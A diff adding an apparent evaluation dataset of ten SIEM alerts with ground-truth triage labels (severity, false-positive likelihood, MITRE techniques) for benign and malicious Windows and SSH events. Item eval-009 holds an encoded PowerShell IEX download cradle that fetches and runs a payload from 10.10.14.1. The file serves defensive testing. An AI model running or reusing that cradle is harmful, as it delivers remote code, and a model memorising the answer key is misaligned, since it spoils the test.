@@ -1,0 +1,373 @@
+[
+  {
+    "id": "eval-001",
+    "description": "SSH brute force from external IP",
+    "alert": {
+      "id": "eval-001",
+      "timestamp": "2026-03-26T12:00:00.000+0000",
+      "rule": {
+        "id": "5710",
+        "level": 10,
+        "description": "sshd: Attempt to login using a denied user.",
+        "groups": ["syslog", "sshd", "authentication_failed"],
+        "mitre": {
+          "id": ["T1110"],
+          "tactic": ["Credential Access"],
+          "technique": ["Brute Force"]
+        }
+      },
+      "agent": {"id": "001", "name": "web-server-01", "ip": "10.0.1.50"},
+      "full_log": "Mar 26 12:00:00 server sshd[12345]: Failed password for invalid user admin from 203.0.113.42 port 54321 ssh2",
+      "data": {"srcip": "203.0.113.42", "dstuser": "admin", "srcport": "54321"},
+      "location": "/var/log/auth.log"
+    },
+    "ground_truth": {
+      "severity": "HIGH",
+      "false_positive_likelihood": "LOW",
+      "mitre_techniques": ["T1110"],
+      "is_benign": false,
+      "notes": "External IP targeting common username. Classic brute force pattern."
+    }
+  },
+  {
+    "id": "eval-002",
+    "description": "Windows hosts file modification",
+    "alert": {
+      "id": "eval-002",
+      "timestamp": "2026-03-26T12:05:00.000+0000",
+      "rule": {
+        "id": "550",
+        "level": 10,
+        "description": "Integrity checksum changed.",
+        "groups": ["ossec", "syscheck", "syscheck_entry_modified"],
+        "mitre": {
+          "id": ["T1565.001"],
+          "tactic": ["Impact"],
+          "technique": ["Stored Data Manipulation"]
+        }
+      },
+      "agent": {"id": "002", "name": "dev-workstation", "ip": "10.0.1.100"},
+      "syscheck": {
+        "path": "C:\\Windows\\System32\\drivers\\etc\\hosts",
+        "size_before": "824",
+        "size_after": "1052",
+        "md5_before": "3b2ce8f5e5c7a3e5b5f5e3c5d5a5f5e5",
+        "md5_after": "7d4af9b2c1e8d3f6a9c2b5e8f1d4a7b3",
+        "changed_attributes": ["size", "md5", "sha1", "sha256", "mtime"],
+        "event": "modified"
+      },
+      "full_log": "File 'C:\\Windows\\System32\\drivers\\etc\\hosts' modified. Size changed from 824 to 1052 bytes.",
+      "location": "syscheck"
+    },
+    "ground_truth": {
+      "severity": "MEDIUM",
+      "false_positive_likelihood": "MEDIUM",
+      "mitre_techniques": ["T1565.001"],
+      "is_benign": false,
+      "notes": "Hosts file changes can be legitimate (dev work) or malicious (DNS hijacking). Requires investigation."
+    }
+  },
+  {
+    "id": "eval-003",
+    "description": "Domain Admins group membership change",
+    "alert": {
+      "id": "eval-003",
+      "timestamp": "2026-03-26T12:10:00.000+0000",
+      "rule": {
+        "id": "60106",
+        "level": 12,
+        "description": "Windows: A member was added to a security-enabled global group.",
+        "groups": ["windows", "windows_security"],
+        "mitre": {
+          "id": ["T1098"],
+          "tactic": ["Persistence"],
+          "technique": ["Account Manipulation"]
+        }
+      },
+      "agent": {"id": "003", "name": "dc-01", "ip": "10.0.1.10"},
+      "data": {
+        "win": {
+          "system": {"eventID": "4728", "computer": "dc-01"},
+          "eventdata": {
+            "targetUserName": "Domain Admins",
+            "memberSid": "S-1-5-21-3623811015-3361044348-30300820-1013",
+            "subjectUserName": "svc_backup",
+            "subjectDomainName": "CORP"
+          }
+        }
+      },
+      "full_log": "A member was added to a security-enabled global group. Group: Domain Admins. Account: svc_backup. Event ID: 4728.",
+      "location": "EventChannel"
+    },
+    "ground_truth": {
+      "severity": "CRITICAL",
+      "false_positive_likelihood": "LOW",
+      "mitre_techniques": ["T1098"],
+      "is_benign": false,
+      "notes": "Service account adding itself to Domain Admins is a strong indicator of privilege escalation. Almost never legitimate."
+    }
+  },
+  {
+    "id": "eval-004",
+    "description": "W32Time registry update (routine NTP sync)",
+    "alert": {
+      "id": "eval-004",
+      "timestamp": "2026-03-26T14:30:00.000+0000",
+      "rule": {
+        "id": "750",
+        "level": 5,
+        "description": "Registry Value Integrity Checksum Changed",
+        "groups": ["ossec", "syscheck", "syscheck_entry_modified", "syscheck_registry"],
+        "mitre": {
+          "id": ["T1112", "T1565.001"],
+          "tactic": ["Defense Evasion", "Impact"],
+          "technique": ["Modify Registry", "Stored Data Manipulation"]
+        }
+      },
+      "agent": {"id": "001", "name": "Collins_Desktop", "ip": "127.0.0.1"},
+      "syscheck": {
+        "path": "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\SecureTimeLimits\\RunTime",
+        "changed_attributes": ["mtime"],
+        "event": "modified"
+      },
+      "full_log": "Registry Key '[x32] HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\SecureTimeLimits\\RunTime' modified\nMode: scheduled\nChanged attributes: mtime",
+      "location": "syscheck"
+    },
+    "ground_truth": {
+      "severity": "LOW",
+      "false_positive_likelihood": "HIGH",
+      "mitre_techniques": ["T1112"],
+      "is_benign": true,
+      "notes": "W32Time SecureTimeLimits is updated automatically during NTP sync. Pure noise."
+    }
+  },
+  {
+    "id": "eval-005",
+    "description": "Successful login after multiple failures",
+    "alert": {
+      "id": "eval-005",
+      "timestamp": "2026-03-26T15:00:00.000+0000",
+      "rule": {
+        "id": "60122",
+        "level": 10,
+        "description": "Windows: Logon Success after multiple failures.",
+        "groups": ["windows", "windows_security", "authentication_success"],
+        "mitre": {
+          "id": ["T1110"],
+          "tactic": ["Credential Access"],
+          "technique": ["Brute Force"]
+        }
+      },
+      "agent": {"id": "004", "name": "file-server-01", "ip": "10.0.1.30"},
+      "data": {
+        "win": {
+          "system": {"eventID": "4624", "computer": "file-server-01"},
+          "eventdata": {
+            "targetUserName": "admin",
+            "ipAddress": "198.51.100.77",
+            "logonType": "10",
+            "workstationName": "UNKNOWN"
+          }
+        }
+      },
+      "full_log": "Successful login for user 'admin' from 198.51.100.77 after 15 failed attempts in the last 5 minutes. Logon type: 10 (RemoteInteractive).",
+      "location": "EventChannel"
+    },
+    "ground_truth": {
+      "severity": "CRITICAL",
+      "false_positive_likelihood": "LOW",
+      "mitre_techniques": ["T1110"],
+      "is_benign": false,
+      "notes": "Successful RDP login from external IP after brute force. Likely compromised account. Immediate response needed."
+    }
+  },
+  {
+    "id": "eval-006",
+    "description": "Windows Defender real-time protection disabled",
+    "alert": {
+      "id": "eval-006",
+      "timestamp": "2026-03-26T16:00:00.000+0000",
+      "rule": {
+        "id": "91530",
+        "level": 12,
+        "description": "Windows Defender Real-Time Protection disabled.",
+        "groups": ["windows", "windows_security"],
+        "mitre": {
+          "id": ["T1562.001"],
+          "tactic": ["Defense Evasion"],
+          "technique": ["Disable or Modify Tools"]
+        }
+      },
+      "agent": {"id": "005", "name": "sales-laptop-03", "ip": "10.0.2.45"},
+      "data": {
+        "win": {
+          "system": {"eventID": "5001", "computer": "sales-laptop-03", "providerName": "Microsoft-Windows-Windows Defender"}
+        }
+      },
+      "full_log": "Windows Defender Real-Time Protection was disabled on sales-laptop-03.",
+      "location": "EventChannel"
+    },
+    "ground_truth": {
+      "severity": "HIGH",
+      "false_positive_likelihood": "MEDIUM",
+      "mitre_techniques": ["T1562.001"],
+      "is_benign": false,
+      "notes": "Could be user installing software, but also common pre-malware step. Needs context on who/why."
+    }
+  },
+  {
+    "id": "eval-007",
+    "description": "New Windows service installed",
+    "alert": {
+      "id": "eval-007",
+      "timestamp": "2026-03-26T17:00:00.000+0000",
+      "rule": {
+        "id": "61138",
+        "level": 8,
+        "description": "Windows: New service installed.",
+        "groups": ["windows", "windows_system"],
+        "mitre": {
+          "id": ["T1543.003"],
+          "tactic": ["Persistence"],
+          "technique": ["Windows Service"]
+        }
+      },
+      "agent": {"id": "006", "name": "hr-workstation-02", "ip": "10.0.2.80"},
+      "data": {
+        "win": {
+          "system": {"eventID": "7045", "computer": "hr-workstation-02"},
+          "eventdata": {
+            "serviceName": "WinUpdateSvc",
+            "imagePathName": "C:\\Users\\Public\\Downloads\\svchost.exe",
+            "serviceType": "user mode service",
+            "startType": "auto start",
+            "accountName": "LocalSystem"
+          }
+        }
+      },
+      "full_log": "A service was installed in the system. Service Name: WinUpdateSvc. Service File Name: C:\\Users\\Public\\Downloads\\svchost.exe. Service Type: user mode service. Service Start Type: auto start. Service Account: LocalSystem.",
+      "location": "EventChannel"
+    },
+    "ground_truth": {
+      "severity": "CRITICAL",
+      "false_positive_likelihood": "LOW",
+      "mitre_techniques": ["T1543.003"],
+      "is_benign": false,
+      "notes": "svchost.exe running from Users\\Public\\Downloads is highly suspicious. Likely malware persistence. The real svchost.exe lives in System32."
+    }
+  },
+  {
+    "id": "eval-008",
+    "description": "Scheduled task created via command line",
+    "alert": {
+      "id": "eval-008",
+      "timestamp": "2026-03-26T18:00:00.000+0000",
+      "rule": {
+        "id": "61640",
+        "level": 10,
+        "description": "Windows: Scheduled task created.",
+        "groups": ["windows", "windows_security"],
+        "mitre": {
+          "id": ["T1053.005"],
+          "tactic": ["Execution", "Persistence"],
+          "technique": ["Scheduled Task"]
+        }
+      },
+      "agent": {"id": "007", "name": "app-server-01", "ip": "10.0.1.60"},
+      "data": {
+        "win": {
+          "system": {"eventID": "4698", "computer": "app-server-01"},
+          "eventdata": {
+            "taskName": "\\Microsoft\\Windows\\Maintenance\\SystemCleanup",
+            "clientProcessId": "4832",
+            "subjectUserName": "SYSTEM"
+          }
+        }
+      },
+      "full_log": "A scheduled task was created. Task Name: \\Microsoft\\Windows\\Maintenance\\SystemCleanup. Created by: SYSTEM.",
+      "location": "EventChannel"
+    },
+    "ground_truth": {
+      "severity": "MEDIUM",
+      "false_positive_likelihood": "MEDIUM",
+      "mitre_techniques": ["T1053.005"],
+      "is_benign": true,
+      "notes": "Task name looks like a legitimate Windows maintenance task under SYSTEM. But should verify the task action is actually benign."
+    }
+  },
+  {
+    "id": "eval-009",
+    "description": "PowerShell encoded command execution",
+    "alert": {
+      "id": "eval-009",
+      "timestamp": "2026-03-26T19:00:00.000+0000",
+      "rule": {
+        "id": "91816",
+        "level": 12,
+        "description": "PowerShell: Suspicious encoded command detected.",
+        "groups": ["windows", "powershell"],
+        "mitre": {
+          "id": ["T1059.001", "T1027"],
+          "tactic": ["Execution", "Defense Evasion"],
+          "technique": ["PowerShell", "Obfuscated Files or Information"]
+        }
+      },
+      "agent": {"id": "008", "name": "dev-server-02", "ip": "10.0.3.15"},
+      "data": {
+        "win": {
+          "system": {"eventID": "4104", "computer": "dev-server-02"},
+          "eventdata": {
+            "scriptBlockText": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA"
+          }
+        }
+      },
+      "full_log": "PowerShell encoded command detected: powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi... (IEX download cradle from 10.10.14.1)",
+      "location": "EventChannel"
+    },
+    "ground_truth": {
+      "severity": "CRITICAL",
+      "false_positive_likelihood": "LOW",
+      "mitre_techniques": ["T1059.001", "T1027"],
+      "is_benign": false,
+      "notes": "Base64-encoded IEX download cradle from internal IP. Classic post-exploitation payload delivery."
+    }
+  },
+  {
+    "id": "eval-010",
+    "description": "Windows Update service restart (routine)",
+    "alert": {
+      "id": "eval-010",
+      "timestamp": "2026-03-26T03:00:00.000+0000",
+      "rule": {
+        "id": "61100",
+        "level": 5,
+        "description": "Windows: Service state changed.",
+        "groups": ["windows", "windows_system"],
+        "mitre": {
+          "id": ["T1489"],
+          "tactic": ["Impact"],
+          "technique": ["Service Stop"]
+        }
+      },
+      "agent": {"id": "009", "name": "workstation-15", "ip": "10.0.2.115"},
+      "data": {
+        "win": {
+          "system": {"eventID": "7036", "computer": "workstation-15"},
+          "eventdata": {
+            "param1": "Windows Update",
+            "param2": "running"
+          }
+        }
+      },
+      "full_log": "The Windows Update service entered the running state at 3:00 AM.",
+      "location": "EventChannel"
+    },
+    "ground_truth": {
+      "severity": "LOW",
+      "false_positive_likelihood": "HIGH",
+      "mitre_techniques": [],
+      "is_benign": true,
+      "notes": "Windows Update service starting at 3 AM is completely routine. Scheduled update check."
+    }
+  }
+]
